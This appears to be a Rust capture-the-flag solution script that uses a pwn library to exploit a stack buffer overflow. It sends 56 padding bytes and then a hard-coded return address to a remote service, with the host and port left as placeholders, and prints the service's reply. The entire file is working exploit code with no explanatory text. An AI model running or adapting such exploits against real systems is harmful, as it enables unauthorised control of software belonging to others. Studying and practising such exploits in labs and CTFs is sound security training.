use pwn::*;
fn main() -> Result<(),Box<dyn std::error::Error>>{
    init_logger();
    let mut payload = b"A".repeat(56);
    payload.append(&mut p64(0x0000000000401206));
    let mut target = Remote::new("your_IP_here", CHANGE_ME_TO_PORT).unwrap();
    let prompt = target.recv()?;
    println!("{}",String::from_utf8_lossy(&prompt));
    target.sendline(payload)?;
    let result = target.clean(std::time::Duration::from_secs(3))?;
    println!("{:?}",String::from_utf8(result));
    Ok(())
}
    
